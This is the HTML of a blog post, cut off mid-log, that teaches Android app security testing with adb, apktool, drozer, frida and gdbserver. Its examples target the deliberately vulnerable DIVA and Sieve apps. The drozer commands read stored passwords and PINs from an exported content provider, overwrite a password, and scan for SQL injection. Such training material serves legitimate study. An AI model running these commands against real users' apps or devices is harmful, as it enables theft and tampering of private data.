@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="default">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Android," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xl7dev" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Tools1) adb Usage123456&amp;gt; adb install diva-beta.apk2797 KB/s (1502294 bytes in 0.524s)	pkg: /data/local/tmp/diva-beta.apkSuccess&amp;gt; adb forward tcp:31415 tcp:31415 2) dex2jar Usage12345&amp;gt; dex2jar">
+<meta name="keywords" content="Android">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Learn Android Security">
+<meta property="og:url" content="https://blog.safebuff.com/2016/03/28/Learn-Android-Security/index.html">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="Tools1) adb Usage123456&amp;gt; adb install diva-beta.apk2797 KB/s (1502294 bytes in 0.524s)	pkg: /data/local/tmp/diva-beta.apkSuccess&amp;gt; adb forward tcp:31415 tcp:31415 2) dex2jar Usage12345&amp;gt; dex2jar">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-10-12T07:36:11.566Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Learn Android Security">
+<meta name="twitter:description" content="Tools1) adb Usage123456&amp;gt; adb install diva-beta.apk2797 KB/s (1502294 bytes in 0.524s)	pkg: /data/local/tmp/diva-beta.apkSuccess&amp;gt; adb forward tcp:31415 tcp:31415 2) dex2jar Usage12345&amp;gt; dex2jar">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.safebuff.com/2016/03/28/Learn-Android-Security/"/>
+
+
+
+
+
+  <title>Learn Android Security | xl7dev</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xl7dev</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2016/03/28/Learn-Android-Security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Learn Android Security</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-03-28T17:37:00+08:00">
+                2016-03-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><h4 id="1-adb-Usage"><a href="#1-adb-Usage" class="headerlink" title="1) adb Usage"></a>1) adb Usage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb install diva-beta.apk</span><br><span class="line"></span><br><span class="line">2797 KB/s (1502294 bytes in 0.524s)</span><br><span class="line">	pkg: /data/local/tmp/diva-beta.apk</span><br><span class="line">Success</span><br><span class="line">&gt; adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
+<h4 id="2-dex2jar-Usage"><a href="#2-dex2jar-Usage" class="headerlink" title="2) dex2jar Usage"></a>2) dex2jar Usage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; dex2jar diva-beta.apk</span><br><span class="line">this cmd is deprecated, use the d2j-dex2jar if possible</span><br><span class="line">dex2jar version: translator-0.0.9.15</span><br><span class="line">dex2jar diva-beta.apk -&gt; diva-beta_dex2jar.jar</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>
+<h4 id="3-jd-gui-Usage"><a href="#3-jd-gui-Usage" class="headerlink" title="3) jd-gui Usage"></a>3) jd-gui Usage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar jd</span><br></pre></td></tr></table></figure>
+<h4 id="4-apktool-Usage"><a href="#4-apktool-Usage" class="headerlink" title="4) apktool Usage"></a>4) apktool Usage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar apktool.jar d diva-beta.apk -o output</span><br><span class="line"></span><br><span class="line">I: Using Apktool 2.1.0 on diva-beta.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /root/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure>
+<h4 id="5-drozer-Usage"><a href="#5-drozer-Usage" class="headerlink" title="5) drozer Usage"></a>5) drozer Usage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb forward tcp:31415 tcp:31415 </span><br><span class="line">&gt; drozer console connect</span><br><span class="line">Selecting 21d2854429974111 (Xiaomi MI 3C 6.0.1)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.3.3)</span><br><span class="line">dz&gt;list</span><br><span class="line">dz&gt; list</span><br><span class="line">app.activity.forintent                  Find activities that can handle the given intent                          </span><br><span class="line">app.activity.info                       Gets information about exported activities.                               </span><br><span class="line">app.activity.start                      Start an Activity                                                         </span><br><span class="line">app.broadcast.info                      Get information about broadcast receivers                                 </span><br><span class="line">app.broadcast.send                      Send broadcast using an intent                                            </span><br><span class="line">app.package.attacksurface               Get attack surface of package                                             </span><br><span class="line">app.package.backup                      Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)</span><br><span class="line">app.package.debuggable                  Find debuggable packages                                                  </span><br><span class="line">app.package.info                        Get information about installed packages                                  </span><br><span class="line">app.package.launchintent                Get launch intent of package                                              </span><br><span class="line">app.package.list                        List Packages                                                             </span><br><span class="line">app.package.manifest                    Get AndroidManifest.xml of package                                        </span><br><span class="line">app.package.native                      Find Native libraries embedded in the application.                        </span><br><span class="line">app.package.shareduid                   Look for packages with shared UIDs                                        </span><br><span class="line">app.provider.columns                    List columns in content provider                                          </span><br><span class="line">app.provider.delete                     Delete from a content provider                                            </span><br><span class="line">app.provider.download                   Download a file from a content provider that supports files               </span><br><span class="line">app.provider.finduri                    Find referenced content URIs in a package                                 </span><br><span class="line">app.provider.info                       Get information about exported content providers                          </span><br><span class="line">app.provider.insert                     Insert into a Content Provider                                            </span><br><span class="line">app.provider.query                      Query a content provider                                                  </span><br><span class="line">app.provider.read                       Read from a content provider that supports files                          </span><br><span class="line">app.provider.update                     Update a record in a content provider                                     </span><br><span class="line">app.service.info                        Get information about exported services                                   </span><br><span class="line">app.service.send                        send a Message to a service, and display the reply                        </span><br><span class="line">app.service.start                       Start Service                                                             </span><br><span class="line">app.service.stop                        Stop Service                                                              </span><br><span class="line">auxiliary.webcontentresolver            Start a web service interface to content providers.                       </span><br><span class="line">exploit.pilfer.general.apnprovider      Reads APN content provider                                                </span><br><span class="line">exploit.pilfer.general.settingsprovider</span><br><span class="line">                                        Reads Settings content provider                                           </span><br><span class="line">information.datetime                    Print Date/Time                                                           </span><br><span class="line">information.deviceinfo                  Get verbose device information                                            </span><br><span class="line">information.permissions                 Get a list of all permissions used by packages on the device              </span><br><span class="line">scanner.misc.native                     Find native components included in packages                               </span><br><span class="line">scanner.misc.readablefiles              Find world-readable files in the given folder                             </span><br><span class="line">scanner.misc.secretcodes                Search for secret codes that can be used from the dialer                  </span><br><span class="line">scanner.misc.sflagbinaries              Find suid/sgid binaries in the given folder (default is /system).         </span><br><span class="line">scanner.misc.writablefiles              Find world-writable files in the given folder                             </span><br><span class="line">scanner.provider.finduris               Search for content providers that can be queried from our context.        </span><br><span class="line">scanner.provider.injection              Test content providers for SQL injection vulnerabilities.                 </span><br><span class="line">scanner.provider.sqltables              Find tables accessible through SQL injection vulnerabilities.             </span><br><span class="line">scanner.provider.traversal              Test content providers for basic directory traversal vulnerabilities.     </span><br><span class="line">shell.exec                              Execute a single Linux command.                                           </span><br><span class="line">shell.send                              Send an ASH shell to a remote listener.                                   </span><br><span class="line">shell.start                             Enter into an interactive Linux shell.                                    </span><br><span class="line">tools.file.download                     Download a File                                                           </span><br><span class="line">tools.file.md5sum                       Get md5 Checksum of file                                                  </span><br><span class="line">tools.file.size                         Get size of file                                                          </span><br><span class="line">tools.file.upload                       Upload a File                                                             </span><br><span class="line">tools.setup.busybox                     Install Busybox.                                                          </span><br><span class="line">tools.setup.minimalsu                   Prepare &apos;minimal-su&apos; binary installation on the device.</span><br></pre></td></tr></table></figure>
+<h4 id="6-pidcat"><a href="#6-pidcat" class="headerlink" title="6) pidcat"></a>6) pidcat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; pidcat com.oprah.bees.android</span><br></pre></td></tr></table></figure>
+<h4 id="7-重新打包签名"><a href="#7-重新打包签名" class="headerlink" title="7) 重新打包签名"></a>7) 重新打包签名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; apktool d demo.apk -o output</span><br><span class="line">&gt; apktool b output -o demo_new.apk</span><br><span class="line">&gt; jarsigner -keystore debug.keystore -storepass android -keypass android demo_new.apk androiddebugkey    #android自带debug.keystore进行签名</span><br></pre></td></tr></table></figure>
+<h4 id="8-port"><a href="#8-port" class="headerlink" title="8) port"></a>8) port</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb shell netstat -a|grep -E &apos;tcp|udp&apos;|grep &apos;LISTEN&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="9-frida"><a href="#9-frida" class="headerlink" title="9) frida"></a>9) frida</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; pip install frida</span><br><span class="line">&gt; wget http://build.frida.re/frida/android/arm/bin/frida-server</span><br><span class="line">&gt; adb push frida-server /data/local/tmp</span><br><span class="line">&gt; adb shell</span><br><span class="line">&gt; cd /data/local/tmp &amp;&amp; chmod +x frida-server &amp;&amp; ./frida-server -t 0</span><br><span class="line">&gt; adb forward tcp:27042 tcp:27042</span><br><span class="line">&gt; adb forward tcp:27043 tcp:27043</span><br><span class="line">&gt; frida-ps -R</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PID NAME</span><br><span class="line"> 204 adbd</span><br><span class="line">2375 android.process.acore</span><br><span class="line">1419 android.process.media</span><br><span class="line"> 179 bridgemgrd</span><br><span class="line"> 906 com.android.launcher</span><br><span class="line"> 881 com.android.nfc</span><br><span class="line"> 839 com.android.phasebeam</span><br><span class="line"> 872 com.android.phone</span><br><span class="line"> 722 com.android.systemui</span><br><span class="line">1674 com.android.vending</span><br></pre></td></tr></table></figure>
+<h4 id="10-android-debug"><a href="#10-android-debug" class="headerlink" title="10) android debug"></a>10) android debug</h4><blockquote>
+<p>Android Studio &gt; Tools &gt; Android &gt; SDK Manager &gt; SDK Tools &gt; Android NDK</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb push gdbserver /system/bin/</span><br><span class="line">&gt; gdbserver tcp:9090 --attach [pid]     //android</span><br><span class="line">&gt; adb forward tcp:9090 tcp:9090</span><br><span class="line">&gt; gdb</span><br><span class="line">(gdb) target remote :9090</span><br></pre></td></tr></table></figure>
+<h4 id="11-Inspeckage"><a href="#11-Inspeckage" class="headerlink" title="11) Inspeckage"></a>11) <a href="https://github.com/ac-pm/Inspeckage" target="_blank" rel="noopener">Inspeckage</a></h4><blockquote>
+<p>open <a href="http://ip:8008" target="_blank" rel="noopener">http://ip:8008</a></p>
+</blockquote>
+<h3 id="OWASP-Mobile-Top-10"><a href="#OWASP-Mobile-Top-10" class="headerlink" title="OWASP Mobile Top 10"></a>OWASP Mobile Top 10</h3><h4 id="Insecure-Data-Storage"><a href="#Insecure-Data-Storage" class="headerlink" title="Insecure Data Storage"></a>Insecure Data Storage</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@cancro:/data/data/com.jianguo.funcontrol/shared_prefs # ls -al</span><br><span class="line">ls -al</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       124 2015-12-19 13:51 AGREE_PROTOCOL.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       799 2016-02-06 18:42 CoreServicePrefs.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       127 2016-01-31 17:09 WebViewChromiumPrefs.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       226 2016-02-06 17:09 com.iflytek.msc.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       133 2016-01-31 17:09 com.jianguo.funcontrol_preferences.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216     72801 2016-02-06 17:09 moive.sp.xml</span><br><span class="line">-rw-rw---- u0_a216  u0_a216       942 2016-02-06 18:42 umeng_general_config.xml</span><br><span class="line"></span><br><span class="line">root@cancro:/data/data/com.mwr.example.sieve # ls -al</span><br><span class="line">ls -al</span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2015-08-03 20:51 cache</span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2016-06-30 00:02 code_cache</span><br><span class="line">drwxrwx--x u0_a188  u0_a188           2014-08-01 22:32 databases</span><br><span class="line">lrwxrwxrwx root     root              2016-06-29 22:36 lib -&gt; /data/app-lib/com.mwr.example.sieve-1</span><br></pre></td></tr></table></figure>
+<h4 id="Attacking-Content-Providers"><a href="#Attacking-Content-Providers" class="headerlink" title="Attacking Content Providers"></a>Attacking Content Providers</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br><span class="line"></span><br><span class="line">dz&gt; run app.provider.finduri com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line"></span><br><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">| Password           | pin  |</span><br><span class="line">| 123456789123456789 | 1234 |</span><br><span class="line"></span><br><span class="line">dz&gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection &quot;pin=1234&quot; --string Password &quot;123456&quot;</span><br><span class="line">Done.</span><br><span class="line"></span><br><span class="line">dz&gt; run scanner.provider.injection -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Not Vulnerable:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"></span><br><span class="line">Injection in Projection:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line"></span><br><span class="line">Injection in Selection:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+<h4 id="Binary-Protections"><a href="#Binary-Protections" class="headerlink" title="Binary Protections"></a>Binary Protections</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; dex2jar diva-beta.apk</span><br><span class="line">this cmd is deprecated, use the d2j-dex2jar if possible</span><br><span class="line">dex2jar version: translator-0.0.9.15</span><br><span class="line">dex2jar diva-beta.apk -&gt; diva-beta_dex2jar.jar</span><br><span class="line">Done.</span><br><span class="line">&gt; jdgui</span><br></pre></td></tr></table></figure>
+<p>or<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; jadx</span><br></pre></td></tr></table></figure></p>
+<h4 id="Insufficient-Transport-Layer-Protection"><a href="#Insufficient-Transport-Layer-Protection" class="headerlink" title="Insufficient Transport Layer Protection"></a>Insufficient Transport Layer Protection</h4><p>危害：缺乏证书校验、弱握手协商容易受到MITM攻击、隐私信息泄漏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过burpsuite抓包工具可以查看到是否加密传输数据</span><br></pre></td></tr></table></figure></p>
+<h4 id="Unintended-Data-Leakage"><a href="#Unintended-Data-Leakage" class="headerlink" title="Unintended Data Leakage"></a>Unintended Data Leakage</h4><p>监控到数据泄漏密码  # String enetered: 123456<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# pidcat.py com.mwr.example.sieve</span><br><span class="line"></span><br><span class="line"> art  I  Late-enabling -Xcheck:jni</span><br><span class="line">         BoostFramework  V  mAcquireFunc method = public int com.qualcomm.qti.Performance.perfLockAcquire(int,int</span><br><span class="line">                            [])</span><br><span class="line">                         V  mReleaseFunc method = public int com.qualcomm.qti.Performance.perfLockRelease()</span><br><span class="line">                         V  mAcquireTouchFunc method = public int com.qualcomm.qti.Performance.perfLockAcquireTou</span><br><span class="line">                            ch(android.view.MotionEvent,android.util.DisplayMetrics,int,int[])</span><br><span class="line">                         V  mIOPStart method = public int com.qualcomm.qti.Performance.perfIOPrefetchStart(int,ja</span><br><span class="line">                            va.lang.String)</span><br><span class="line">                         V  mIOPStop method = public int com.qualcomm.qti.Performance.perfIOPrefetchStop()</span><br><span class="line">                         V  BoostFramework() : mPerf = com.qualcomm.qti.Performance@817a13</span><br><span class="line">                         V  BoostFramework() : mPerf = com.qualcomm.qti.Performance@804f450</span><br><span class="line">         OpenGLRenderer  D  Use EGL_SWAP_BEHAVIOR_PRESERVED: true</span><br><span class="line">             Adreno-EGL  I  &lt;qeglDrvAPI_eglInitialize:379&gt;: EGL 1.4 QUALCOMM build: Nondeterministic_AU_msm8974_L</span><br><span class="line">                            A.BF.1.1.3_RB1__release_AU (Ia10634f51b)</span><br><span class="line">                         I  OpenGL ES Shader Compiler Version: E031.29.00.00</span><br><span class="line">                         I  Build Date: 01/10/16 Sun</span><br><span class="line">                         I  Local Branch: mybranch17687478</span><br><span class="line">                         I  Remote Branch: quic/LA.BF.1.1.3_rb1.8</span><br><span class="line">                         I  Local Patches: NONE</span><br><span class="line">                         I  Reconstruct Branch: NOTHING</span><br><span class="line">         OpenGLRenderer  I  Initialized EGL, version 1.4</span><br><span class="line">         ActivityThread  D  Loading provider com.mwr.example.sieve.DBContentProvider: com.mwr.example.sieve.DBCon</span><br><span class="line">                            tentProvider</span><br><span class="line">            m_MainLogin  D  String enetered: 123456</span><br><span class="line">               Timeline  I  Timeline: Activity_launch_request time:7110102</span><br><span class="line">         BoostFramework  V  BoostFramework() : 